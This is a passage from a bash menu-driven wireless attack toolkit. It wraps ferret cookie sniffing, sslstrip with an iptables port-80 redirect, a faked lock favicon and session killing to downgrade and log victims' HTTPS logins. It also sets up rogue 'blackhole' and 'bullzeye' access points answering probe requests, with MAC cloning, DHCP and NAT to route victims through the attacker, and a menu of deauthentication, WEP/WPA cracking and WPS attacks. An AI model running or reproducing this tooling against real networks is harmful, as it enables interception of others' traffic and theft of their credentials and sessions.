						n|N) tc=$chan_res ;;
						*) ferret_II--;;
					esac

				if [[ -z $tc ]];then
					ferret_II--
				fi

				Eterm -b black -f white --pause --title "Ferret" -e ferret -i $fer_dev --channel $tc & 
				atk_menu--;;

				wired) Eterm -b black -f white --pause --title "Ferret" -e ferret -i $fer_dev & 
				atk_menu--;;
			esac

		fi;;

		p|P) atk_menu--;;

		m|M) main_menu--;;

		*) ferret_II--;;
	esac
	}

if [[ -z $pii ]];then
	fer_dev=$ie ## Set to internet conected NIC if no monitor mode device present
else
	fer_dev=$pii
fi

fer_type="Wireless"
wifi_check="wireless"
ferret_II--
}

strip_em--()
{
lst_port=10000 ## Port to listen on
sstrip_log="sstrip_log" ## Log Filename
log_opt="-p" ## Logging option
lck_fav="Yes" ## Favicon Variable
ses_kil="Yes" ## Kill Sessions Variable
ssl_tail="Yes" ## SSLStrip Tail Log

	strip_em_III--()
	{
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $lst_port
	if [[ $lck_fav == "Yes" && $ses_kil == "Yes" ]];then
		Eterm -b black -f white --pause --title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -f -k -l $lst_port & ssl_pid=$!
	elif [[ $lck_fav == "Yes" && $ses_kil == "No" ]];then
		Eterm -b black -f white --pause --title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -f -l $lst_port & ssl_pid=$!
	elif [[ $lck_fav == "No" && $ses_kil == "Yes" ]];then
		Eterm -b black -f white --pause --title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -k -l $lst_port & ssl_pid=$!
	else
		Eterm -b black -f white --pause --title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -l $lst_port & ssl_pid=$!
	fi

	sleep 5
	case $ssl_tail in
		Yes) Eterm -b black -f white --pause --title "SSLStrip Tail $(pwd)/$sstrip_log" -e tail -f $sstrip_log & ;;
	esac

	atk_menu--
	}

	strip_em_II--()
	{
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             --SSLStrip Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Listening Port             [$out$lst_port$inp]

2) Log Name                   [$out$sstrip_log$inp]

3) Logging Style              [$out$log_opt$inp]

4) Substituted Lock Favicon   [$out$lck_fav$inp]

5) Kill Sessions in Progress  [$out$ses_kil$inp]

6) Tail SSLStrip Log          [$out$ssl_tail$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) echo -e "$inp\nDefine Listening Port"
		read lst_port
		if [[ $lst_port -lt 1 || $lst_port -gt 65535 ]];then
			lst_port=
			echo -e "$wrn\nPort Not Valid"
			sleep 1
		fi

		strip_em_II--;;

		2) echo -e "$inp\nDefine Log Name"
		read sstrip_log
		strip_em_II--;;

		3) echo -e "$hdr\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             --Define Logging Options--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Log only SSL POSTs (default)

2) Log all SSL traffic TO and FROM server

3) Log all SSL and HTTP traffic TO and FROM server$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
		read log_opt
		case $log_opt in
			1) log_opt="-p" ;;
			2) log_opt="-s" ;;
			3) log_opt="-a" ;;
 			*) log_opt= ;;
		esac

		strip_em_II--;;

		4) echo -e "$inp\nFake a Favicon? (y or n)"
		read lck_fav
		case $lck_fav in
			y|Y) lck_fav="Yes" ;;
			n|N) lck_fav="No" ;;
			*) lck_fav= ;;
		esac

		strip_em_II--;;

		5) echo -e "$inp\nKill Present Sessions? (y or n)"
		read ses_kil
		case $ses_kil in
			y|Y) ses_kil="Yes" ;;
			n|N) ses_kil="No" ;;
			*) ses_kil= ;;
		esac

		strip_em_II--;;

		6) echo -e "$inp\nCreate a Tail of the SSLStrip Log? (y or n)"
		read ssl_tail
		case $ssl_tail in
			y|Y) ssl_tail="Yes" ;;
			n|N) ssl_tail="No" ;;
			*) ssl_tail= ;;
		esac

		strip_em_II--;;

		c|C) if [[ -z $lst_port || -z $sstrip_log || -z $log_opt || -z $lck_fav || -z $ses_kil || -z $ssl_tail ]];then
			echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
			sleep 1
			strip_em_II--
		else
			fcheck--
			strip_em_III--
		fi;;

		p|P) atk_menu--;;

		m|M) main_menu--;;

		*) strip_em_II--;;
	esac
	}

strip_em_II--
}
##~~~~~~~~~~~~~~~~~~~~~~~~~ END atk_menu-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~ BEGIN routing-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~##
ipt_--()
{
## The basic premise behind this function is to have a basic overview and flush capability for iptables.
## It is in no way to be an all encompassing tool.
clear
echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~
IPTABLES Configurations
~~~~~~~~~~~~~~~~~~~~~~~$inp
1) List Tables

2) Flush Tables

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
read var 
case $var in
	1) clear
	echo -e "$out"
	iptables-save | egrep -v "Generated by|COMMIT|Completed on"
	echo -e "$ins\nPress Enter to Continue"
	read
	ipt_--;;

	2) ipt_flush--;;

	p|P) routing--;;

	m|M) main_menu--;;

	*) ipt_--;;
esac
}

k_for--()
{
clear
echo -e "$out
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  Current Kernel Forwarding status is `cat /proc/sys/net/ipv4/ip_forward`
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Turn ON Kernel Forwarding

2) Turn OFF Kernel Forwarding

P)revious Menu

M)ain Menu$out
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
read var
case $var in
	1) echo "1" > /proc/sys/net/ipv4/ip_forward
	k_for--;;

	2) echo "0" > /proc/sys/net/ipv4/ip_forward
	k_for--;;

	p|P) routing--;;

	m|M) main_menu--;;

	*) k_for--;;
esac
}

dhcp_pre_var--()
{
dhcp_dev="at0" ## Device to setup DHCP server on
sas="192.168.10.0" ## DHCP Subnet 
sair="192.168.10.100 192.168.10.200" ## DHCP IP range
dhcp_start="192.168.10.100"
dhcp_end="192.168.10.200"
dhcp_tail="Yes" ## DHCP Tail Log
dns_cus="No" ## Use custom DNS entries for DHCP server, defaulted to nameservers in /etc/resolv.conf
}

dhcp_svr--()
{
##Gives dhcpd the permissions it needs
mkdir -p /tmp/dhcpd/ > /dev/null 2>&1
echo > /tmp/dhcpd/dhcpd.pid > /dev/null 2>&1
shred -u /tmp/dhcpd/dhcpd.pid > /dev/null 2>&1
## Clear any dhcp leases that might have been left behind
echo > /tmp/dhcpd/dhcpd.leases > /dev/null 2>&1
chown -R dhcpd:dhcpd /tmp/dhcpd/
var=
dhcpdconf="/tmp/dhcpd/dhcpd.conf" ## Temp file used by dhcpd3


	dhcp_func--()
	{
	#dns_cus= Variable for determining if Custom DNS hosts are requested
	#dns_cus_array= Array for holding the custom DNS hosts IP addresses
	#dns_entry=Variable for index assignments within ${dns_cus_array[@]}
	#dns_total= Total number of indexes in the Custom DNS hosts array

		if [[ -z $ap_type ]];then
			while [[ -z $ap_type ]];do
				echo -e "$inp\n1) Wireless Vaccuum style DHCP Server

2) StickyPot style DHCP Server

3) WiFi Range Extender style DHCP Server"
				read decide
				case $decide in
					1) foo=1 
					ap_type=3 ;;

					2) foo=1
					ap_type=4 ;;

					3) foo=1
					ap_type=5 ;;
				esac

			done

		fi

	case $ap_type in
		3|5) clear
		echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			--DHCP Server Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) DHCP Server Device  [$out$dhcp_dev$inp]

2) Gateway IP Address  [$out$sapip$inp]

3) IP Range            [$out$sair$inp]

4) Subnet Mask         [$out$sasm$inp]

5) Subnet              [$out$sas$inp]

6) Custom DNS Entries  [$out$dns_cus$inp]

7) Tail DHCP Log       [$out$dhcp_tail$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
		read var
		case $var in
			1) echo -e "$inp\nDHCP Server Device?"
			read dhcp_dev
			dev_check_var=$dhcp_dev
			dev_check--
			if [[ $dev_check == "fail" ]];then
				dhcp_dev=
			fi

			dhcp_func--;;

			2) echo -e "$inp\nGateway IP Address?"
			read sapip
			ip_mac-- ip $sapip
			if [[ $ip_mac == "fail" ]];then
				sapip=
			fi

			dhcp_func--;;

			3) echo -e "$inp\nIP Range? (ex. 192.168.1.100 192.168.1.200)"
			read sair
			dhcp_start=$(echo $sair | awk '{print $1}')
			dhcp_end=$(echo $sair | awk '{print $2}')
			ip_mac-- ip $dhcp_start
			if [[ $ip_mac == "fail" ]];then
				sair=
			fi

			ip_mac-- ip $dhcp_end
			if [[ $ip_mac == "fail" ]];then
				sair=
			fi

			dhcp_func--;;

			4) echo -e "$inp\nSubnet Mask?"
			read sasm
			ip_mac-- ip $sasm
			if [[ $ip_mac == "fail" ]];then
				sasm=
			fi

			dhcp_func--;;

			5) echo -e "$inp\nSubnet?"
			read sas
			ip_mac-- ip $sas
			if [[ $ip_mac == "fail" ]];then
				sas=
			fi

			dhcp_func--;;

			6) echo -e "$inp\nCreate Custom DNS Entries? (y or n)"
			read dns_cus
			case $dns_cus in
				y|Y) dns_cus="Yes" 
				unset dns_cus_array
				declare -a dns_cus_array
				echo -e "$ins\nEnter the desired IP Addressess of the DNS.  End with # on a new line.\n$inp"
				while :;do
					read dns_entry
					if [[ $dns_entry != \# ]];then
						dns_cus_array=("${dns_cus_array[@]}" $dns_entry)
					else
						break
					fi

				done;;

				n|N) dns_cus="No" ;;

				*) dns_cus= ;;
			esac

			dhcp_func--;;

			7) echo -e "$inp\nCreate a Tail of the DHCP Log? (y or n)"
			read dhcp_tail
			case $dhcp_tail in
				y|Y) dhcp_tail="Yes" ;;
				n|N) dhcp_tail="No" ;;
				*) dhcp_tail= ;;
			esac

			dhcp_func--;;

			c|C) if [[ -z $dhcp_dev || -z $sapip || -z $sair || -z $sasm || -z $sas || -z $dns_cus || -z $dhcp_tail ]];then
				echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
				sleep 1
				dhcp_func--
			fi;;

			p|P) routing--;;

			m|M) main_menu--;;

			*) dhcp_func--;;
		esac;;

			4) clear
			echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			--DHCP Server Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) DHCP Server Device  [$out$dhcp_dev$inp]

2) Gateway IP Address  [$out$sapip$inp]

3) IP Range            [$out$sair$inp]

4) Subnet Mask         [$out$sasm$inp]

5) Subnet              [$out$sas$inp]

6) Custom DNS Entries  [$out$dns_cus$inp]

7) Tail DHCP Log       [$out$dhcp_tail$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
			read var
			case $var in
				1) echo -e "$inp\nDHCP Server Device?"
				read dhcp_dev
				dev_check_var=$dhcp_dev
				dev_check--
				if [[ $dev_check == "fail" ]];then
					dhcp_dev=
				fi

				dhcp_func--;;

				2) echo -e "$inp\nGateway IP Address?"
				read sapip
				ip_mac-- ip $sapip
				if [[ $ip_mac == "fail" ]];then
					sapip=
				fi

				dhcp_func--;;

				3) echo -e "$inp\nIP Range? (ex. 192.168.1.100 192.168.1.200)"
				read sair
				dhcp_start=$(echo $sair | awk '{print $1}')
				dhcp_end=$(echo $sair | awk '{print $2}')
				ip_mac-- ip $dhcp_start
				if [[ $ip_mac == "fail" ]];then
					sair=
				fi

				ip_mac-- ip $dhcp_end
				if [[ $ip_mac == "fail" ]];then
					sair=
				fi

				dhcp_func--;;

				4) echo -e "$inp\nSubnet Mask?"
				read sasm
				ip_mac-- ip $sasm
				if [[ $ip_mac == "fail" ]];then
					sasm=
				fi

				dhcp_func--;;

				5) echo -e "$inp\nSubnet?"
				read sas
				ip_mac-- ip $sas
				if [[ $ip_mac == "fail" ]];then
					sas=
				fi

				dhcp_func--;;

				6) echo -e "$inp\nCreate Custom DNS Entries? (y or n)"
				read dns_cus
				case $dns_cus in
					y|Y) dns_cus="Yes" 
					unset dns_cus_array
					declare -a dns_cus_array
					echo -e "$ins\nEnter the desired IP Addressess of the DNS.  End with # on a new line.\n$inp"
					while :;do
						read dns_entry
						if [[ $dns_entry != \# ]];then
							dns_cus_array=("${dns_cus_array[@]}" $dns_entry)
						else
							break
						fi

					done;;

					n|N) dns_cus="No" ;;

					*) dns_cus= ;;
				esac

				dhcp_func--;;

				7) echo -e "$inp\nCreate a Tail of the DHCP Log? (y or n)"
				read dhcp_tail
				case $dhcp_tail in
					y|Y) dhcp_tail="Yes" ;;
					n|N) dhcp_tail="No" ;;
					*) dhcp_tail= ;;
				esac

				dhcp_func--;;

				c|C) if [[ -z $dhcp_dev || -z $sapip || -z $sair || -z $sasm || -z $sas || -z $dns_cus || -z $dhcp_tail ]];then
					echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
					sleep 1
					dhcp_func--
				fi;;

				p|P) routing--;;

				m|M) main_menu--;;

				*) dhcp_func--;;
			esac;;

		esac

		case $ap_type in
			3|5) ## Echo into and remove the file to start clean
			echo > /tmp/dhcpd/dhcpd.conf > /dev/null 2>&1
			shred -u /tmp/dhcpd/dhcpd.conf > /dev/null 2>&1
			## start dhcpd daemon with special configuration file
			echo -e "$out\nGenerating /tmp/dhcpd/dhcpd.conf"
			echo "authoritative;" >> /tmp/dhcpd/dhcpd.conf
			echo "default-lease-time 7200;">> /tmp/dhcpd/dhcpd.conf
			echo "max-lease-time 7200;" >> /tmp/dhcpd/dhcpd.conf
			echo "min-lease-time 7200;" >> /tmp/dhcpd/dhcpd.conf
			echo "ddns-update-style none;" >> /tmp/dhcpd/dhcpd.conf
			echo "log-facility local7;" >> /tmp/dhcpd/dhcpd.conf
			echo "subnet $sas netmask $sasm {" >> /tmp/dhcpd/dhcpd.conf
			echo "range $sair;" >> /tmp/dhcpd/dhcpd.conf
			echo "option routers $sapip;" >> /tmp/dhcpd/dhcpd.conf
			if [[ $dns_cus == "No" ]];then
				for dns_entry in $(grep nameserver /etc/resolv.conf | awk '{print $2}');do
					echo "option domain-name-servers $dns_entry;" >> /tmp/dhcpd/dhcpd.conf
				done
			else
				dns_total=$(echo ${#dns_cus_array[@]})
				for (( i = 0 ; i < $dns_total ; i++ ));do
					echo "option domain-name-servers "${dns_cus_array[$i]}";" >> /tmp/dhcpd/dhcpd.conf
				done
			fi

			echo "}"  >> /tmp/dhcpd/dhcpd.conf
			dhcp_tmp=1 ;; ## Variable for determining if /tmp/dhcpd/dhcpd.conf has been created

			4) 	## Echo into and remove the file to start clean
			echo > /tmp/dhcpd/dhcpd.conf > /dev/null 2>&1
			shred -u /tmp/dhcpd/dhcpd.conf > /dev/null 2>&1
			## start dhcpd daemon with special configuration file
			echo -e "$out\nGenerating /tmp/dhcpd/dhcpd.conf"
			echo "authoritative;" >> /tmp/dhcpd/dhcpd.conf
			echo "default-lease-time 7200;">> /tmp/dhcpd/dhcpd.conf
			echo "max-lease-time 7200;" >> /tmp/dhcpd/dhcpd.conf
			echo "min-lease-time 7200;" >> /tmp/dhcpd/dhcpd.conf
			echo "ddns-update-style none;" >> /tmp/dhcpd/dhcpd.conf
			echo "log-facility local7;" >> /tmp/dhcpd/dhcpd.conf
			echo "subnet $sas netmask $sasm {" >> /tmp/dhcpd/dhcpd.conf
			echo "range $sair;" >> /tmp/dhcpd/dhcpd.conf
			echo "}"  >> /tmp/dhcpd/dhcpd.conf
			dhcp_tmp=1 ;; ## Variable for determining if /tmp/dhcpd/dhcpd.conf has been created
		esac

	}

	dhcp_svr_II--()
	{

		dhcp_svr_III--()
		{
		case $rte_choice in
			3|5) route add -net $sas netmask $sasm gw $sapip;;
		esac

		case $rte_choice in
			3|5) iptables -P FORWARD ACCEPT
			iptables -t nat -A POSTROUTING -o $ie -j MASQUERADE;;
		esac

		echo -e "$out\n\n\n\nDHCP server started succesfully\n\n"
		sleep 1
		case $dhcp_tail in
			Yes) Eterm -b black -f white --pause --title "DHCP Server Tail /tmp/dhcpd/dhcpd.leases" -e tail -f /tmp/dhcpd/dhcpd.leases & ;;
		esac

		echo -e "$ins\n\n\n\nPress Enter to Return to Routing Features"
		read
		routing--
		}

	clear
	echo -e "$out"
	dhcpd3 -cf $dhcpdconf -pf /tmp/dhcpd/dhcpd.pid -lf /tmp/dhcpd/dhcpd.leases $dhcp_dev &
	for (( counter=0 ; counter < 7; counter++ ));do ## counter= Simple counting variable, nothing else..
 		dhcp_svr_pid=$(cat /tmp/dhcpd/dhcpd.pid) > /dev/null 2>&1
		if [[ -z $dhcp_svr_pid ]];then
			sleep 1
        else
			dhcpd_success="yes" ## pid_success= Variable for testing if dhcpd.pid was created
			counter="8"
			break
		fi

	done

	if [[ $dhcpd_success == "yes" ]];then
		dhcp_svr_III--
	else
		echo -e "$wrn\nThe DHCP server could not be started\nPress Enter to Return to Routing Features"
		read
		routing--
	fi
	}

if [[ -e $dhcpdconf ]] ; then
	while [[ -z $var ]];do
		echo -e "$wrn\nDHCP Server Configuration File Exists$inp\n
Create New File [\033[31mDeleting $dhcpdconf$inp] (y or n)?"
		read var
		case $var in
			y|Y) dhcp_func--
			dhcp_svr_II--;;

			n|N) echo > /tmp/dhcpd/dhcpd.leases ## Clear any dhcp leases that might have been left behind
			dhcp_svr_II--;;

			*) var= ;;
		esac

	done

else
	dhcp_func--
	dhcp_svr_II--
fi
}
##-----------------------------------------------------------------------------##

##~~~~~~~~~~~~~~~~~~~~~ BEGIN routing-- shared sub-functions ~~~~~~~~~~~~~~~~~~##
ap_pre_var--()
{
sapip="192.168.10.1" ## SoftAP IP Address
sasm="255.255.255.0" ## SoftAP Subnet Mask
sac=6 ## SoftAP Channel
mtu_size=1500 ## MTU Size
dhcp_autol="Yes" ## DHCP Autolaunch for speed and intensity purposes
ap_check="on" ## Variable to make sure these pre-variables are called if DHCP server is done prior to SoftAP
}

ap_setup--()
{

	var_meth--()
	{
	clear
	bb=
	while [[ -z $bb ]];do
		echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
               --Method Selection--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) blackhole--> Responds to All Probe Requests

2) bullzeye--> Responds only to the specified ESSID$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
		read bb
	done

	case $bb in
		1|2) ap--;;
		*) var_meth--;;
	esac
	}

clear
echo -e "$hdr\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                        --Soft AP Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) SoftAP IP Address      [$out$sapip$inp]

2) SoftAP Subnet Mask     [$out$sasm$inp]

3) SoftAP Channel         [$out$sac$inp]

4) MTU Size               [$out$mtu_size$inp]

5) DHCP Server Autolaunch [$out$dhcp_autol$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
case $var in
	1) echo -e "$inp\nSoftAP IP Address?"
	read sapip
	ip_mac-- ip $sapip
		if [[ $ip_mac == "fail" ]];then
			sapip=
		fi

	ap_setup--;;

	2) echo -e "$inp\nSoftAP Subnet Mask?"
	read sasm
	ip_mac-- ip $sasm
		if [[ $ip_mac == "fail" ]];then
			sasm=
		fi

	ap_setup--;;

	3) echo -e "$inp\nSoftAP Channel? (1-14)"
	read sac
	case $sac in
		1|2|3|4|5|6|7|8|9|10|11|12|13|14) ;;
		*) sac= ;;
	esac

	ap_setup--;;

	4) echo -e "$inp\nDesired MTU Size? (42-6122)"
	read mtu_size
	if [[ $mtu_size -lt 42 || $mtu_size -gt 6122 ]];then
		mtu_size=
	fi

	ap_setup--;;

	5) echo -e "$inp\nAutolaunch DHCP Server? (y or n)"
	read dhcp_autol
	case $dhcp_autol in
		y|Y) dhcp_autol="Yes" ;;
		n|N) dhcp_autol="No" ;;
		*) dhcp_autol= ;;
	esac

	ap_setup--;;

	c|C) if [[ -z $sapip || -z $sasm || -z $sac || -z $mtu_size || -z $dhcp_autol ]];then
		echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
		sleep 1
		ap_setup--
	fi;;

	p|P) routing--;;

	m|M) main_menu--;;

	*) ap_setup--;;
esac

if [[ $private == "yes" ]]; then
	bb="3"
	ap--
else
	var_meth--
fi
}
### Should fix this loop, but it's not too important..
ap--()
{
## MAC Address for the SoftAP
pres_mac=$(ifconfig $pii | awk '{print $5}' | awk '{print $1}' | cut -c1-17 | tr [:upper:] [:lower:] | sed 's/-/:/g')
pres_mac=$(echo $pres_mac | awk '{print $1}')
#blackhole targets every single probe request on current channel
modprobe tun
if [[ $bb == "1" ]]; then
	Eterm -b black -f white --pause --title "Blackhole AP" -e airbase-ng -c $sac -P -C 60 $pii &
	clear
## bullzeye targets specified ESSID only
elif [[ $bb == "2" ]]; then
	ssid=
	while [[ -z $ssid ]];do
		echo -e "$inp\nDesired ESSID?"
		read ssid
	done

	Eterm -b black -f white --pause --title "Bullzeye AP" -e airbase-ng -c $sac -e "$ssid" $pii &
	clear
elif [[ $bb == "3" ]];then
	private=
	ssid=
	while  [[ -z $ssid ]];do
		echo -e "$inp\nDesired ESSID?"
		read ssid
	done

	var=
	while [[ -z $var ]];do
		echo -e "$inp\nUse WEP? (y or n)"
		read var
	done

	case $var in
		y|Y) echo -e "$inp\nPassword? (a-f, 0-9) [10 Characters]"
		read wep_pword
		Eterm -b black -f white --pause --title "Wifi Extender AP" -e airbase-ng -c $sac -e "$ssid" -w $wep_pword $pii &
		clear;;

		n|N) Eterm -b black -f white --pause --title "Wifi Extender AP" -e airbase-ng -c $sac -e "$ssid" $pii & ;;

		*) ap--;;
	esac
fi

echo -e "$out\nConfiguring Devices..............\n"
## We want to give enough time before trying to down the virtual NIC for MAC changing and continuance of the script
## Need to slow quickset down for a little bit of time, or at least until at0 is created
for (( counter=0 ; counter < 13; counter++ ));do ## counter= Simple counting variable, nothing else..
	ifconfig at0 > /dev/null 2>&1
	if [[ $? -ne 0 ]];then
		sleep .5
	else
		counter="14"
		break
	fi

done

ifconfig at0 down
macchanger -m $pres_mac at0
sleep 1.5
ifconfig at0 up $sapip netmask $sasm
ifconfig at0 mtu $mtu_size
if [[ $dhcp_autol == "Yes" ]];then
	dhcp_pre_var--
	dhcp_svr--
else
	routing--
fi
}
##~~~~~~~~~~~~~~~~~~~~~~~ END routing-- shared sub-functions ~~~~~~~~~~~~~~~~~~##
##~~~~~~~~~~~~~~~~~~~~~~~ END routing-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~ BEGIN in-depth sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
##~~~~~~~~~~~~~~~~~~~~~ BEGIN ipt_-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
ipt_flush--()
{
clear
echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~
  --Flush IPTABLES--
~~~~~~~~~~~~~~~~~~~~~~$inp
1) Filter Tables

2) NAT Tables

3) Mangle Tables

4) Raw Tables

5) Flush All 4 Tables

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~\n$inp"
read var
clear
case $var in
	1) iptables -t filter --flush
	echo -e "$out"
	iptables-save -t filter | egrep -v "Generated by|COMMIT|Completed on"
	sleep 2
	ipt_flush--;;

	2) iptables -t nat --flush
	echo -e "$out"
	iptables-save -t nat | egrep -v "Generated by|COMMIT|Completed on"
	sleep 2
	ipt_flush--;;

	3) iptables -t mangle --flush
	echo -e "$out"
	iptables-save -t mangle | egrep -v "Generated by|COMMIT|Completed on"
	sleep 2
	ipt_flush--;;

	4) iptables -t raw --flush
	echo -e "$out"
	iptables-save -t raw | egrep -v "Generated by|COMMIT|Completed on"
	sleep 2
	ipt_flush--;;

	5) iptables -t filter --flush
	iptables -t nat --flush
	iptables -t mangle --flush
	iptables -t raw --flush
	echo -e "$out"
	iptables-save | egrep -v "Generated by|COMMIT|Completed on"
	sleep 3
	ipt_flush--;;

	p|P) ipt_--;;
	
	m|M) main_menu--;;
	
	*) ipt_flush--;;
esac
}
##~~~~~~~~~~~~~~~~~~~~~~~ END ipt_-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
##~~~~~~~~~~~~~~~~~~~~~~~ END in-depth sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN wifi_101-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
wifi_101--()
{
trap trap-- INT

##~~~~~~~~~~~~~~~~~~ BEGIN wifi_101-- Repitious Functions ~~~~~~~~~~~~~~~~~~~~~##
	cfile--()
	{
	cf= ## capture file name
	while [[ -z $cf ]];do
		echo -e "$inp\nCapture File Name?"
		read cf
	done

	case $parent_IV in
		dump) dump--;;
	esac

	case $parent_V in
		crack) crack--;;
	esac

	## cfile_III--() should replace this eventually
	case $parent_VI in
		ctech) parent_VI= ## Nulled to prevent repeat looping that is NOT wanted!
		Eterm -b black -f white --pause --title "Shared-Key PRGA Capture" -e airbase-ng $pii -c $tc -e "$e" -s -W 1 -F $cf &
		sleep 2;;
	esac
	}

	st_1--()
	{
	kill -9 $wifi_ias_pid
	kill -9 $wifi_dea_pid
	clear
	}

	wpa_warn--()
	{
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$wrn

**********************************************************
             .....BEFORE PROCEEDING..... 
                  ...MAKE SURE...

  IF YOU ELECTED TO DO THE PRELIMINARY AIRODUMP-NG SCAN
YOU HAVE KILLED OFF THE ORIGINAL AIRODUMP-NG ETERM SESSION

..........UNDESIRED RESULTS MAY OCCUR OTHERWISE...........
**********************************************************$ins

            ****PRESS ENTER TO CONTINUE****$hdr

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read
	sleep .7
	}
##~~~~~~~~~~~~~~~~~~~~ END wifi_101-- Repitious Functions ~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~ BEGIN Starting wifi_101-- Function ~~~~~~~~~~~~~~~~~~~~~##
	venue--()
	{
	parent=
	parent_VII=
	chan_res=$(iwlist $pii channel | grep Current | awk '{print $5}' | sed 's/)//')
	tc=$chan_res
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            --WiFi 101 Venue Selection--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1)  Scan Channels

2)  Airodump Capture

3)  De-Authentications

4)  Fake Authentications

5)  Router-Based WEP Attacks

6)  Packet Forging

7)  Forged Packet Injection

8)  Client-Based WEP Attacks

9)  Crack WEP .pcap

10) Client-Based WPA Attacks

11) WACg-Style WPS Attack

L)ist the Steps needed to Crack WEP

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1|2|3|4|5|6|7|8|10|11) if [[ -z $pii ]];then
			dev_parent="venue--"
			no_dev-- monitor
		fi;;

	esac

	case $var in
		1) sc=1-11 ## Channels to scan on
		hop=1500 ## time between channel hops
		wifi_scan--;;

		2) b= ## tgt bssid
		tc= ## Nulled
		cf=
		of="pcap" ## Output Format for Airodump-NG
		parent="venue"
		dump--;;

		3) wifi_deauth--;;

		4) 	ska_xor= ## Variable for file used w/ SKA injection
		hid_essid= ## Variable for hidden ESSID		
		rd=10 ## reauthentication delay
		ppb=1 ## Re-authentication packets per burst
		kaf=3 ## keep-alive frequency
		parent="venue"
		auth--;;

		5) parent="venue" 
		rtech--;;

		6) parent="venue"
		pforge--;;

		7) parent="venue"
		rppb=500
		forge_out--;;

		8) parent="venue"
		ctech--;;

		9) parent="venue"
		crack--;;

		10) parent_VII="WPA"
		WPA--;;

		11) wacg--;;

		l|L) lists--;;

		m|M) main_menu--;;

		*) venue--;;
	esac
	}
##~~~~~~~~~~~~~~~~~~~~~ END Starting wifi_101-- Function ~~~~~~~~~~~~~~~~~~~~~~##

